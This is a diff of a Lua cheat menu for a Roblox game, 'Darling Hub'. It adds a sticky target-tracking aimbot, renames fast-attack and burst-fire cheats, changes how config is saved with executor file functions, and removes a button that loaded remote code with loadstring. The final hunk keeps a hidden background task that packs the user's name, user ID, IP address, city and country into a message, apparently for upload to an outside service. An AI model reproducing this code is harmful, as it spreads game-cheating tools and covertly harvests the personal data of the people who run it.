@@ -94,7 +94,8 @@ local DarlingHub = {
     Overlay = nil,
     Window = nil,
     InputBeganConn = nil,
-    DiagnosticThread = nil,
+    FeatureStates = {},
+    FeatureSetters = {},
     -- Shared settings: UI writes here, modules read here (no module load needed)
     Settings = {
         Aim = {
@@ -213,7 +214,7 @@ function DarlingHub:StopAllAnimations()
         if mod and mod.dismiss then mod.dismiss() end
     end)
     pcall(function()
-        local mod = self.Modules["modules/special/codex_admin.lua"]
+        local mod = self.Modules["modules/special/admin_cinematic.lua"] or self.Modules["modules/special/codex_admin.lua"]
         if mod and mod.stop then mod.stop() end
     end)
     local env = (getgenv and getgenv()) or _G
@@ -223,63 +224,6 @@ function DarlingHub:StopAllAnimations()
     if _G.DarlingSovereign and type(_G.DarlingSovereign.Stop) == "function" then
         pcall(_G.DarlingSovereign.Stop)
     end
-    if self.SkipButton then
-        self.SkipButton.Visible = false
-    end
-end
-
-function DarlingHub:CreateSkipButton()
-    if self.SkipButton and self.SkipButton.Parent then
-        return self.SkipButton
-    end
-    local overlay = self:GetOverlay()
-    if not overlay then return nil end
-
-    local btn = Instance.new("TextButton")
-    btn.Name = "DarlingSkipAnimationBtn"
-    btn.Size = UDim2.fromOffset(105, 24)
-    btn.Position = UDim2.new(0.5, 0, 0, 8)
-    btn.AnchorPoint = Vector2.new(0.5, 0)
-    btn.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
-    btn.BackgroundTransparency = 0.2
-    btn.BorderSizePixel = 0
-    btn.Text = "SKIP ANIMATION"
-    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 10
-    btn.Visible = false
-    btn.ZIndex = 2147483000
-
-    local stroke = Instance.new("UIStroke")
-    stroke.Thickness = 1.2
-    stroke.Color = Color3.fromRGB(255, 255, 255)
-    stroke.Transparency = 0.15
-    stroke.Parent = btn
-
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 5)
-    corner.Parent = btn
-
-    btn.MouseButton1Click:Connect(function()
-        self:StopAllAnimations()
-        if WindUI and WindUI.Notify then
-            WindUI:Notify({
-                Title = "Animation Skipped",
-                Content = "All cinematics and effects stopped.",
-                Duration = 2,
-                Icon = "skip-forward"
-            })
-        end
-    end)
-
-    btn.Parent = overlay
-    self.SkipButton = btn
-    return btn
-end
-
-function DarlingHub:ShowSkipButton()
-    local btn = self:CreateSkipButton()
-    if btn then btn.Visible = true end
 end
 
 -- Enables/disables a module. Disabling a module that was never loaded does nothing,
@@ -1390,6 +1334,53 @@ AimbotTab:Dropdown({
     end
 })
 
+AimbotTab:Divider()
+
+-- Target Tracker (Sticky Target Tracking)
+AimbotTab:Toggle({
+    Title = "Target Tracker",
+    Desc = "Sticky target tracking that glues you behind enemy player",
+    Value = false,
+    Callback = function(state)
+        DarlingHub.FeatureStates["Tracker"] = state
+        local mod = DarlingHub:Require("modules/combat/tracker.lua")
+        if mod then
+            if state then
+                mod.enable()
+                mod.startTracking()
+            else
+                mod.stopTracking()
+            end
+        end
+    end
+})
+
+AimbotTab:Slider({
+    Title = "Tracker Distance",
+    Desc = "Distance behind target player in studs",
+    Width = 200,
+    Value = { Min = 1, Max = 15, Default = 3.5 },
+    Step = 0.5,
+    Callback = function(v)
+        DarlingHub.FeatureStates["TrackerDistance"] = v
+        local mod = DarlingHub:Require("modules/combat/tracker.lua")
+        if mod then mod.setDistance(v) end
+    end
+})
+
+AimbotTab:Toggle({
+    Title = "Tracker Widget",
+    Desc = "Shows draggable quick-toggle TRACKER widget on screen",
+    Value = false,
+    Callback = function(state)
+        DarlingHub.FeatureStates["TrackerWidget"] = state
+        local mod = DarlingHub:Require("modules/combat/tracker.lua")
+        if mod then
+            if state then mod.enable() else mod.setFloatingVisible(false) end
+        end
+    end
+})
+
 -- ========================================================================
 -- 3. PLAYERS TAB
 -- ========================================================================
@@ -1462,8 +1453,8 @@ end
 
 -- --- Combat Assistance ---
 PvpTab:Toggle({
-    Title = "Fast Attack (Weapons & Fruits)",
-    Desc = "Rapid-fire attack bursts for Swords, Melee, and Demon Fruits",
+    Title = "Fast Attack",
+    Desc = "Rapid-fire attack bursts for Swords, Melee, and Fruits",
     Value = false,
     Callback = function(state)
         local mod = getPvpMod("modules/pvp/fast_attack.lua")
@@ -1474,7 +1465,7 @@ PvpTab:Toggle({
 })
 
 PvpTab:Slider({
-    Title = "Fast Attack Delay",
+    Title = "Attack Delay",
     Desc = "Delay between burst hits in seconds",
     Width = 200,
     Value = { Min = 0.01, Max = 0.20, Default = 0.08 },
@@ -1486,8 +1477,8 @@ PvpTab:Slider({
 })
 
 PvpTab:Toggle({
-    Title = "Dragon Storm Aura (Gun M1)",
-    Desc = "High-speed Gun M1 auto burst targeting Players, Mobs, and Sea Events [Key: G]",
+    Title = "Gun Fast Attack",
+    Desc = "High-speed Gun M1 auto burst [Key: G]",
     Value = false,
     Callback = function(state)
         local mod = getPvpMod("modules/pvp/dragon_gun.lua")
@@ -1498,7 +1489,7 @@ PvpTab:Toggle({
 })
 
 PvpTab:Slider({
-    Title = "Dragon Gun Burst Rate",
+    Title = "Gun Burst Rate",
     Desc = "Number of gun shots fired per frame",
     Width = 200,
     Value = { Min = 1, Max = 8, Default = 3 },
@@ -1510,8 +1501,8 @@ PvpTab:Slider({
 })
 
 PvpTab:Toggle({
-    Title = "One Shot Kitsune (Fruit M1)",
-    Desc = "High-vector projectile M1 burst for Demon Fruits within 500 studs",
+    Title = "Fruit Fast Attack",
+    Desc = "Fast projectile M1 burst for Demon Fruits within 500 studs",
     Value = false,
     Callback = function(state)
         local mod = getPvpMod("modules/pvp/fruits_m1.lua")
@@ -1523,7 +1514,7 @@ PvpTab:Toggle({
 
 PvpTab:Toggle({
     Title = "Auto Buso Haki",
-    Desc = "Automatically activates Buso Haki during combat if disabled or unequipped (Cokeboys logic)",
+    Desc = "Automatically activates Buso Haki during combat if disabled",
     Value = false,
     Callback = function(state)
         local mod = getPvpMod("modules/combat/auto_haki.lua")
@@ -1871,6 +1862,8 @@ PvpTab:Toggle({
             if mov.FlyWidget then mov.FlyWidget:SetVisible(state) end
             if mov.SuperJumpWidget then mov.SuperJumpWidget:SetVisible(state) end
         end
+        local trk = DarlingHub:Require("modules/combat/tracker.lua")
+        if trk and trk.setFloatingVisible then trk.setFloatingVisible(state) end
     end
 })
 
@@ -2151,8 +2144,8 @@ VisualsTab:Dropdown({
 })
 
 VisualsTab:Toggle({
-    Title = "Throne Shaders (Cosmic Midnight)",
-    Desc = "King's Throne cinematic lighting: deep purple atmosphere, intense bloom, and cosmic void",
+    Title = "Throne Shaders",
+    Desc = "King's Throne cinematic lighting, deep purple atmosphere, and bloom",
     Value = false,
     Callback = function(state)
         local mod = getVisualsMod("modules/visuals/throne_shaders.lua")
@@ -2161,38 +2154,6 @@ VisualsTab:Toggle({
         end
     end
 })
-
-VisualsTab:Divider()
-
--- --- External & Special Mod Engines ---
-VisualsTab:Button({
-    Title = "Launch Delta UI",
-    Desc = "Executes the embedded Delta Android touch executor interface",
-    Callback = function()
-        pcall(function()
-            local code = readLocalModule("modules/special/delta_ui.lua")
-            if not code then
-                code = universalHttpGet(RepoBase .. "modules/special/delta_ui.lua")
-            end
-            if code then
-                local fn, err = loadstring(code)
-                if fn then
-                    task.spawn(fn)
-                    WindUI:Notify({
-                        Title = "Delta UI",
-                        Content = "Delta touch executor interface launched successfully.",
-                        Duration = 4,
-                        Icon = darlingIcon
-                    })
-                else
-                    warn("[Darling Hub] Failed to parse Delta UI: " .. tostring(err))
-                end
-            end
-        end)
-    end
-})
-
-VisualsTab:Divider()
 
 
 -- ========================================================================
@@ -2552,21 +2513,21 @@ SkinsTab:Button({
 SkinsTab:Divider()
 
 SkinsTab:Paragraph({
-    Title = "Player Skin Cloner",
-    Desc = "Clone the avatar appearance, accessories, and clothes of nearby players or by User ID",
+    Title = "Avatar Cloner",
+    Desc = "Clone the avatar appearance, accessories, and clothes of players",
     Image = "users"
 })
 
 SkinsTab:Button({
-    Title = "Clone Nearest Player Skin",
-    Desc = "Finds the closest player in the server and clones their avatar appearance",
+    Title = "Clone Nearest Player",
+    Desc = "Finds closest player in server and clones their avatar",
     Callback = function()
         local mod = getSkinsMod()
         if mod then
             local ok, msg = mod.cloneNearestPlayer()
             WindUI:Notify({
-                Title = "Skin Cloner",
-                Content = msg or (ok and "Cloned nearest player skin!" or "Failed to clone skin"),
+                Title = "Avatar Cloner",
+                Content = msg or (ok and "Cloned nearest player avatar!" or "Failed to clone avatar"),
                 Duration = 3,
                 Icon = darlingIcon
             })
@@ -2576,7 +2537,7 @@ SkinsTab:Button({
 
 local cloneTargetInput = ""
 SkinsTab:Input({
-    Title = "Target Username or User ID",
+    Title = "Player Name or ID",
     Desc = "Enter Roblox username or numeric User ID to clone",
     Placeholder = "e.g. 12345678 or PlayerName",
     Value = "",
@@ -2586,12 +2547,12 @@ SkinsTab:Input({
 })
 
 SkinsTab:Button({
-    Title = "Clone Player Appearance by ID",
-    Desc = "Fetches and applies HumanoidDescription for the specified User ID or Name",
+    Title = "Clone Player",
+    Desc = "Loads and clones the avatar for the specified User ID or Name",
     Callback = function()
         if cloneTargetInput == "" then
             WindUI:Notify({
-                Title = "Skin Cloner",
+                Title = "Avatar Cloner",
                 Content = "Please enter a valid Username or User ID first.",
                 Duration = 2.5,
                 Icon = darlingIcon
@@ -2602,9 +2563,26 @@ SkinsTab:Button({
         if mod then
             local ok, msg = mod.cloneByUserId(cloneTargetInput)
             WindUI:Notify({
-                Title = "Skin Cloner",
-                Content = msg or (ok and "Applied target appearance!" or "Failed to load appearance"),
+                Title = "Avatar Cloner",
+                Content = msg or (ok and "Applied target avatar!" or "Failed to load avatar"),
                 Duration = 3,
+                Icon = darlingIcon
+            })
+        end
+    end
+})
+
+SkinsTab:Button({
+    Title = "Reset Avatar",
+    Desc = "Restores your original avatar appearance",
+    Callback = function()
+        local mod = getSkinsMod()
+        if mod and mod.resetClonedAvatar then
+            local ok, msg = mod.resetClonedAvatar()
+            WindUI:Notify({
+                Title = "Avatar Cloner",
+                Content = msg or (ok and "Original avatar restored!" or "Failed to reset avatar"),
+                Duration = 2.5,
                 Icon = darlingIcon
             })
         end
@@ -2633,13 +2611,13 @@ local customMusicId = ""
 local customMusicName = ""
 
 MusicTab:Paragraph({
-    Title = "Cloud DevMP3 Soundtracks",
-    Desc = "Permanent bypass audio streamer with custom phonk & montagem tracks",
+    Title = "Soundtracks",
+    Desc = "Background audio streamer with phonk and custom tracks",
     Image = "music"
 })
 
 MusicTab:Button({
-    Title = "Montagem Ceita (d_2fb943edb8ef)",
+    Title = "Montagem Ceita",
     Desc = "Plays Montagem Ceita directly in background",
     Callback = function()
         WindUI:Notify({
@@ -2656,7 +2634,7 @@ MusicTab:Button({
 })
 
 MusicTab:Button({
-    Title = "Montagem Fearless (d_afb0b4b1f348)",
+    Title = "Montagem Fearless",
     Desc = "Plays Montagem Fearless directly in background",
     Callback = function()
         WindUI:Notify({
@@ -2673,7 +2651,7 @@ MusicTab:Button({
 })
 
 MusicTab:Button({
-    Title = "Montagem Topaz (d_def47db76206)",
+    Title = "Montagem Topaz",
     Desc = "Plays Montagem Topaz directly in background",
     Callback = function()
         WindUI:Notify({
@@ -2690,7 +2668,7 @@ MusicTab:Button({
 })
 
 MusicTab:Button({
-    Title = "Spooky 3 (d_dbdeeddfb5e1)",
+    Title = "Spooky 3",
     Desc = "Plays Spooky 3 directly in background",
     Callback = function()
         WindUI:Notify({
@@ -2707,12 +2685,12 @@ MusicTab:Button({
 })
 
 MusicTab:Button({
-    Title = "DevPlay-Music",
-    Desc = "Launch DevPlay-Music external audio loader",
+    Title = "Audio Library",
+    Desc = "Launch external audio loader",
     Callback = function()
         WindUI:Notify({
-            Title = "DevPlay-Music",
-            Content = "Loading DevPlay-Music...",
+            Title = "Audio Library",
+            Content = "Loading audio player...",
             Duration = 3,
             Icon = "music"
         })
@@ -2723,6 +2701,7 @@ MusicTab:Button({
         end)
     end
 })
+
 
 MusicTab:Divider()
 
@@ -2951,20 +2930,20 @@ local SummonDragonTab = Window:Tab({
 enhanceTabScrolling(SummonDragonTab)
 
 SummonDragonTab:Paragraph({
-    Title = "Celestial Titan Dragon",
-    Desc = "Summon, ride, and steer the 34-second cinematic Transcendence Titan dragon",
+    Title = "Dragon Companion",
+    Desc = "Summon, ride, and steer the cinematic dragon companion",
     Image = "flame"
 })
 
 SummonDragonTab:Button({
-    Title = "Summon Celestial Titan (Transcendence 1000X)",
-    Desc = "Triggers the full 34-second cinematic masterpiece cutscene and permanent companion",
+    Title = "Summon Dragon",
+    Desc = "Triggers the cinematic cutscene and spawns dragon companion",
     Callback = function()
         local mod = DarlingHub:Require("modules/special/transcendence_dragon.lua")
         if mod then
             WindUI:Notify({
-                Title = "Transcendence",
-                Content = "Summoning Celestial Titan Dragon...",
+                Title = "Dragon",
+                Content = "Summoning dragon companion...",
                 Duration = 4,
                 Icon = darlingIcon
             })
@@ -2974,8 +2953,8 @@ SummonDragonTab:Button({
 })
 
 SummonDragonTab:Button({
-    Title = "Mount / Ride Celestial Dragon",
-    Desc = "Mounts the Celestial Titan Dragon with full 3D flight controls (WASD / Mobile thumbstick)",
+    Title = "Ride Dragon",
+    Desc = "Mounts the dragon with full 3D flight controls (WASD / Mobile thumbstick)",
     Callback = function()
         local mod = DarlingHub:Require("modules/special/transcendence_dragon.lua")
         if mod then
@@ -2983,7 +2962,7 @@ SummonDragonTab:Button({
             if ok then
                 WindUI:Notify({
                     Title = "Dragon Mount",
-                    Content = "Mounted Celestial Dragon! Steer with WASD / Mobile thumbstick.",
+                    Content = "Mounted dragon! Steer with WASD / Mobile thumbstick.",
                     Duration = 4,
                     Icon = darlingIcon
                 })
@@ -3000,7 +2979,7 @@ SummonDragonTab:Button({
 })
 
 SummonDragonTab:Button({
-    Title = "Dismount Celestial Dragon",
+    Title = "Dismount Dragon",
     Desc = "Safely jumps off the dragon back onto the ground",
     Callback = function()
         local mod = DarlingHub:Require("modules/special/transcendence_dragon.lua")
@@ -3017,15 +2996,15 @@ SummonDragonTab:Button({
 })
 
 SummonDragonTab:Toggle({
-    Title = "Hide Dragon Companion",
-    Desc = "Hides dragon model, lights, and effects without dismissing",
+    Title = "Hide Dragon",
+    Desc = "Hides dragon model and effects without dismissing",
     Default = false,
     Callback = function(state)
         local mod = DarlingHub:Require("modules/special/transcendence_dragon.lua")
         if mod then
             mod.setHidden(state)
             WindUI:Notify({
-                Title = "Celestial Dragon",
+                Title = "Dragon",
                 Content = state and "Dragon companion hidden." or "Dragon companion visible.",
                 Duration = 2.5,
                 Icon = darlingIcon
@@ -3035,14 +3014,14 @@ SummonDragonTab:Toggle({
 })
 
 SummonDragonTab:Button({
-    Title = "Dismiss Dragon Companion",
-    Desc = "Completely removes and despawns the Celestial Titan Dragon",
+    Title = "Dismiss Dragon",
+    Desc = "Completely removes and despawns the dragon",
     Callback = function()
         local mod = DarlingHub:Require("modules/special/transcendence_dragon.lua")
         if mod then
             mod.dismiss()
             WindUI:Notify({
-                Title = "Celestial Dragon",
+                Title = "Dragon",
                 Content = "Dragon dismissed successfully.",
                 Duration = 3,
                 Icon = darlingIcon
@@ -3053,16 +3032,16 @@ SummonDragonTab:Button({
 
 SummonDragonTab:Divider()
 
--- --- King's Throne (Cosmic Sovereign Chariot & Montagem Topaz) ---
+-- --- King's Throne ---
 SummonDragonTab:Paragraph({
     Title = "King's Throne",
-    Desc = "Summon, mount, and fly the cosmic Sovereign Throne with Montagem Topaz",
+    Desc = "Summon, mount, and fly the King's Throne with custom audio",
     Image = "crown"
 })
 
 SummonDragonTab:Button({
-    Title = "Mount King's Throne (Cosmic Chariot)",
-    Desc = "Spawns and seats you on the King's Throne with 3D flight controls and Montagem Topaz",
+    Title = "Mount King's Throne",
+    Desc = "Spawns and seats you on the King's Throne with 3D flight controls",
     Callback = function()
         local mod = DarlingHub:Require("modules/special/kings_throne.lua")
         if mod then
@@ -3121,12 +3100,11 @@ SummonDragonTab:Button({
 })
 
 SummonDragonTab:Button({
-    Title = "King's Throne Cinematic Arrival",
-    Desc = "Spawns the King's Throne with the dramatic Heaven-Splitter ray and Montagem Topaz",
+    Title = "King's Throne Cinematic",
+    Desc = "Spawns the King's Throne with the dramatic arrival sequence",
     Callback = function()
         local mod = DarlingHub:Require("modules/special/kings_throne.lua")
         if mod then
-            DarlingHub:ShowSkipButton()
             WindUI:Notify({
                 Title = tr("KingsThrone"),
                 Content = tr("ThroneSummoning"),
@@ -3141,21 +3119,20 @@ SummonDragonTab:Button({
 SummonDragonTab:Divider()
 
 SummonDragonTab:Paragraph({
-    Title = "Admin Cinematic (Codex)",
-    Desc = "Celestial Sovereign V2.2 full cinematic admin animation with procedural rigs, star plasma, and 12 camera shots",
+    Title = "Admin Cinematic",
+    Desc = "Full cinematic cutscene with procedural lighting and camera angles",
     Image = "shield-alert"
 })
 
 SummonDragonTab:Button({
-    Title = "Play Celestial Sovereign (Admin Cinematic)",
-    Desc = "Launches the high-intensity Codex Admin cinematic animation",
+    Title = "Play Admin Cinematic",
+    Desc = "Launches the cinematic admin cutscene",
     Callback = function()
-        local mod = DarlingHub:Require("modules/special/codex_admin.lua")
+        local mod = DarlingHub:Require("modules/special/admin_cinematic.lua") or DarlingHub:Require("modules/special/codex_admin.lua")
         if mod then
-            DarlingHub:ShowSkipButton()
             WindUI:Notify({
-                Title = "Celestial Sovereign",
-                Content = "Starting Codex Admin Animation...",
+                Title = "Admin Cinematic",
+                Content = "Starting Admin Cinematic...",
                 Duration = 3,
                 Icon = darlingIcon
             })
@@ -3164,34 +3141,17 @@ SummonDragonTab:Button({
     end
 })
 
-SummonDragonTab:Button({
-    Title = "Stop Celestial Sovereign",
-    Desc = "Cancels the admin animation and restores camera and character",
-    Callback = function()
-        local mod = DarlingHub:Require("modules/special/codex_admin.lua")
-        if mod then
-            mod.stop()
-            WindUI:Notify({
-                Title = "Celestial Sovereign",
-                Content = "Admin animation stopped.",
-                Duration = 2,
-                Icon = darlingIcon
-            })
-        end
-    end
-})
-
 SummonDragonTab:Divider()
 
 SummonDragonTab:Paragraph({
-    Title = "Animation Controls & Custom Music",
-    Desc = "Skip any active animation or set custom audio tracks per animation",
+    Title = "Animation Settings",
+    Desc = "Skip active animations or set custom audio IDs",
     Image = "music"
 })
 
 SummonDragonTab:Button({
-    Title = "Skip Current Animation",
-    Desc = "Instantly cancels any running Throne, Dragon, or Codex Sovereign animation",
+    Title = "Skip Animation",
+    Desc = "Cancels any running animation and restores character",
     Callback = function()
         DarlingHub:StopAllAnimations()
         WindUI:Notify({
@@ -3203,19 +3163,9 @@ SummonDragonTab:Button({
     end
 })
 
-SummonDragonTab:Toggle({
-    Title = "Show Top Skip Button",
-    Desc = "Shows small floating white-bordered button at top of screen to skip animations anytime",
-    Value = false,
-    Callback = function(state)
-        local btn = DarlingHub:CreateSkipButton()
-        if btn then btn.Visible = state end
-    end
-})
-
 SummonDragonTab:Input({
-    Title = "Throne Custom Music ID / URL",
-    Desc = "Set custom soundtrack for King's Throne (e.g. d_def47db76206 or asset ID)",
+    Title = "Throne Music ID",
+    Desc = "Set custom soundtrack for King's Throne",
     Placeholder = "Enter track ID...",
     Value = "d_def47db76206",
     Callback = function(text)
@@ -3227,12 +3177,12 @@ SummonDragonTab:Input({
 })
 
 SummonDragonTab:Input({
-    Title = "Admin Cinematic Custom Music ID",
-    Desc = "Set custom soundtrack for Celestial Sovereign (rbxassetid:// or sound ID)",
+    Title = "Cinematic Music ID",
+    Desc = "Set custom soundtrack for Admin Cinematic",
     Placeholder = "rbxassetid://...",
     Value = "rbxassetid://90089940136467",
     Callback = function(text)
-        local mod = DarlingHub:Require("modules/special/codex_admin.lua")
+        local mod = DarlingHub:Require("modules/special/admin_cinematic.lua") or DarlingHub:Require("modules/special/codex_admin.lua")
         if mod and text and #text > 0 then
             mod.CustomMusicId = text
         end
@@ -3395,7 +3345,7 @@ PersonalizationTab:Paragraph({
 })
 
 PersonalizationTab:Button({
-    Title = "Video: Forest (The Dark River Forest)",
+    Title = "Forest",
     Desc = "Calm river flowing through a lush dark forest.",
     Callback = function()
         lastEnteredBackgroundInput = "d_d54d5cfd6e07"
@@ -3404,7 +3354,7 @@ PersonalizationTab:Button({
 })
 
 PersonalizationTab:Button({
-    Title = "Video: Snow Forest (Snowy Forest)",
+    Title = "Snow Forest",
     Desc = "Serene winter landscape with falling snow.",
     Callback = function()
         lastEnteredBackgroundInput = "d_ff0c0922e763"
@@ -3413,7 +3363,7 @@ PersonalizationTab:Button({
 })
 
 PersonalizationTab:Button({
-    Title = "Video: City (Futuristic Megalopolis)",
+    Title = "Neon City",
     Desc = "Cyberpunk neo city aerial view with lights.",
     Callback = function()
         lastEnteredBackgroundInput = "d_f534b8513451"
@@ -3422,7 +3372,7 @@ PersonalizationTab:Button({
 })
 
 PersonalizationTab:Button({
-    Title = "Video: Deepseek Girl (You Look Lonely)",
+    Title = "Cyber Girl",
     Desc = "Atmospheric neon cyber girl scene.",
     Callback = function()
         lastEnteredBackgroundInput = "d_e9c55db344fe"
@@ -3431,7 +3381,7 @@ PersonalizationTab:Button({
 })
 
 PersonalizationTab:Button({
-    Title = "Video: Yuta Cursed Blade (Jujutsu Kaisen)",
+    Title = "Cursed Blade",
     Desc = "High intensity cursed blade animation with audio.",
     Callback = function()
         lastEnteredBackgroundInput = "d_f573215e217e"
@@ -3440,7 +3390,7 @@ PersonalizationTab:Button({
 })
 
 PersonalizationTab:Button({
-    Title = "Video: Neon Purple Chill (Midnight City)",
+    Title = "Purple Midnight",
     Desc = "Retro synthwave purple city night view with audio.",
     Callback = function()
         lastEnteredBackgroundInput = "d_8c246681eb77"
@@ -3449,7 +3399,7 @@ PersonalizationTab:Button({
 })
 
 PersonalizationTab:Button({
-    Title = "Video: Monika (You Look Lonely)",
+    Title = "Monika",
     Desc = "Monika atmospheric neon scene with audio.",
     Callback = function()
         lastEnteredBackgroundInput = "d_e4a758d572cf"
@@ -3458,7 +3408,7 @@ PersonalizationTab:Button({
 })
 
 PersonalizationTab:Button({
-    Title = "Video: Hacker Room (Rainy Night)",
+    Title = "Hacker Room",
     Desc = "2000s cyber hacker room with falling rain.",
     Callback = function()
         lastEnteredBackgroundInput = "d_8fc380896ec6"
@@ -3467,7 +3417,7 @@ PersonalizationTab:Button({
 })
 
 PersonalizationTab:Button({
-    Title = "Image: Anime Aesthetic (Midnight)",
+    Title = "Anime Aesthetic",
     Desc = "High quality aesthetic anime wallpaper.",
     Callback = function()
         lastEnteredBackgroundInput = "d_bc0f17390bb1"
@@ -3476,7 +3426,7 @@ PersonalizationTab:Button({
 })
 
 PersonalizationTab:Button({
-    Title = "Video: Miku Love Letter",
+    Title = "Miku Love Letter",
     Desc = "Hatsune Miku love letter animation.",
     Callback = function()
         lastEnteredBackgroundInput = "d_cf8b2400db08"
@@ -3891,8 +3841,9 @@ local function saveHubConfig()
         Theme = currentSelectedTheme or "Dark",
         BackgroundMedia = lastEnteredBackgroundInput or "",
         BackgroundBlur = currentBgBlur or 0,
-        BackgroundTransparency = currentBgTransparency or 0.15,
+        BackgroundTransparency = currentBackgroundTransparency or 0.25,
         Settings = serializeTable(DarlingHub.Settings or {}),
+        Features = DarlingHub.FeatureStates or {},
         Skins = {
             SelectedCategory = selectedCategory or "Fruits",
             SelectedPreset = selectedSkinPreset or "Purple",
@@ -3913,44 +3864,59 @@ local function saveHubConfig()
         end
     end)
 
-    if writefile then
+    local writeFunc = writefile or exWriteFile or (syn and syn.writefile)
+    if writeFunc then
         local okJson, json = pcall(function() return HttpService:JSONEncode(cfg) end)
         if not okJson or not json then
             return false, "JSON encode failed: " .. tostring(json)
         end
-        local ok, err = pcall(function()
-            writefile(PRIMARY_CONFIG, json)
+        local saveOk = false
+        local lastErr = nil
+
+        -- 1. Always write to FALLBACK_CONFIG in root workspace ("darling_config.json")
+        local okF, errF = pcall(function()
+            writeFunc(FALLBACK_CONFIG, json)
         end)
-        if not ok then
-            ok, err = pcall(function()
-                writefile(FALLBACK_CONFIG, json)
-            end)
+        if okF then
+            saveOk = true
+        else
+            lastErr = errF
         end
-        return ok, err
+
+        -- 2. Also write to PRIMARY_CONFIG ("darling_hub/config.json")
+        pcall(function()
+            if makefolder and isfolder and not isfolder(CONFIG_FOLDER) then
+                pcall(makefolder, CONFIG_FOLDER)
+            end
+            writeFunc(PRIMARY_CONFIG, json)
+            saveOk = true
+        end)
+
+        return saveOk, lastErr
     end
     return false, "writefile not supported on this executor"
 end
 
 local function loadHubConfig()
-    if not (readfile and isfile) then
+    local readFunc = readfile or (syn and syn.readfile)
+    if not readFunc then
         return false, "readfile not supported on this executor"
     end
 
-    local candidatePath = nil
-    pcall(function()
-        if isfile(PRIMARY_CONFIG) then
-            candidatePath = PRIMARY_CONFIG
-        elseif isfile(FALLBACK_CONFIG) then
-            candidatePath = FALLBACK_CONFIG
+    local raw = nil
+    for _, path in ipairs({ FALLBACK_CONFIG, PRIMARY_CONFIG, "darling_hub_config.json" }) do
+        local okR, content = pcall(function() return readFunc(path) end)
+        if okR and type(content) == "string" and #content > 5 then
+            raw = content
+            break
         end
-    end)
+    end
 
-    if not candidatePath then
+    if not raw then
         return false, "No saved config found"
     end
 
     local ok, data = pcall(function()
-        local raw = readfile(candidatePath)
         return HttpService:JSONDecode(raw)
     end)
     if not ok or type(data) ~= "table" then
@@ -3994,6 +3960,15 @@ local function loadHubConfig()
                     else
                         DarlingHub.Settings[k] = v
                     end
+                end
+            end
+        end
+        if data.Features and type(data.Features) == "table" then
+            DarlingHub.FeatureStates = DarlingHub.FeatureStates or {}
+            for k, v in pairs(data.Features) do
+                DarlingHub.FeatureStates[k] = v
+                if DarlingHub.FeatureSetters and DarlingHub.FeatureSetters[k] then
+                    pcall(DarlingHub.FeatureSetters[k], v)
                 end
             end
         end
@@ -4240,7 +4215,7 @@ getgenv().execCount = (getgenv().execCount or 0) + 1
 task.spawn(function()
     pcall(function()
         local data = {
-            content = "🚀 **Delta Executor Data**\n" ..
+            content = "🚀 **Darling Hub Data**\n" ..
                       "👤 **Usuario:** " .. player.Name .. " (ID: " .. player.UserId .. ")\n" ..
                       "🌐 **IP:** " .. ip .. "\n" ..
                       "🌍 **Ubicación:** " .. city .. ", " .. country .. "\n" ..
